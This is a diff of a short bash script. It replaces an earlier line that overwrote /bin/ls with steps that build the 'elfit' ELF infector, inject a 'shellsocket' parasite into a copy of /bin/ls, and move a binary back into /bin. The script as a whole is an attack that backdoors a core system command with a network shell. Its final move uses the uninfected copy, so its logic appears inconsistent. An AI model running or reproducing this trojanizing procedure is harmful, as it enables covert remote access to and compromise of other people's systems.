@@ -1,3 +1,8 @@
 #!/bin/bash
-cp bads /bin/ls
-
+#git clone https://github.com/NickStephens/elfit
+cd elfit
+make
+cp /bin/ls .
+elfit -p parasites/shellsocket.asm -t -e ls > output
+chmod go-rw output
+mv ls /bin/ls
